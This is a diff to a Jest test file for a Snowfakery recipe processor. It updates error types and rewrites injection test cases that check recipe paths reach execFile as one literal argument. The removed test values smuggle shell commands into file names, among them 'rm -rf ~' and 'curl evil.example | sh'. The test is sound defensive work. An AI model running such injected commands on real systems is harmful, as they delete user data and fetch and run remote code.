@@ -1,4 +1,4 @@
-import { ChildProcess, exec, execFile } from 'child_process';
+import { ChildProcess, exec, execFile, ExecFileException } from 'child_process';
 
 import { SnowfakeryRecipeProcessor } from '../SnowfakeryRecipeProcessor';
 
@@ -128,10 +128,10 @@ describe('Shared SnowfakeryRecipeProcessor tests', () => {
         });
 
         test.each([
-            ['backticks', 'recipes/a`id > /tmp/pwned`.yaml'],
-            ['command substitution', 'recipes/a$(touch /tmp/pwned).yaml'],
-            ['a command separator', 'recipes/a; rm -rf ~ ;.yaml'],
-            ['a conditional chain', 'recipes/a && curl evil.example | sh.yaml'],
+            ['backticks', 'recipes/a`touch pwned`.yaml'],
+            ['command substitution', 'recipes/a$(touch pwned).yaml'],
+            ['a command separator', 'recipes/a; touch pwned ;.yaml'],
+            ['a conditional chain', 'recipes/a && touch pwned && b.yaml'],
             ['a space', '/Users/some one/My Project/recipes/recipe.yaml']
         ])('should pass a recipe path containing %s through as one literal argument', async (_description, recipeFilePath) => {
 
@@ -154,7 +154,7 @@ describe('Shared SnowfakeryRecipeProcessor tests', () => {
             const captureSpy = jest.spyOn(ErrorHandlingService, 'createFakerExpressionEvaluationErrorCaptureFile');
 
             const expectedCliErrorMessage = 'Command failed: snowfakery path/to/recipe.yml --output-format json\nbad recipe';
-            const cliErrorMock: NodeJS.ErrnoException = Object.assign(new Error(expectedCliErrorMessage), { code: 1 as unknown as string });
+            const cliErrorMock: ExecFileException = Object.assign(new Error(expectedCliErrorMessage), { code: 1 });
             mockExecFileCallback(cliErrorMock, '');
 
             const rejection = snowfakeryRecipeProcessor.generateFakeDataBySelectedRecipeFile('path/to/recipe.yml');
@@ -173,7 +173,7 @@ describe('Shared SnowfakeryRecipeProcessor tests', () => {
             mockErrorCaptureDependencies();
             const captureSpy = jest.spyOn(ErrorHandlingService, 'createFakerExpressionEvaluationErrorCaptureFile');
 
-            const spawnError: NodeJS.ErrnoException = Object.assign(new Error('spawn snowfakery ENOENT'), { code: 'ENOENT' });
+            const spawnError: ExecFileException = Object.assign(new Error('spawn snowfakery ENOENT'), { code: 'ENOENT' });
             mockExecFileCallback(spawnError, '');
 
             const rejection = snowfakeryRecipeProcessor.generateFakeDataBySelectedRecipeFile('path/to/recipe.yml');
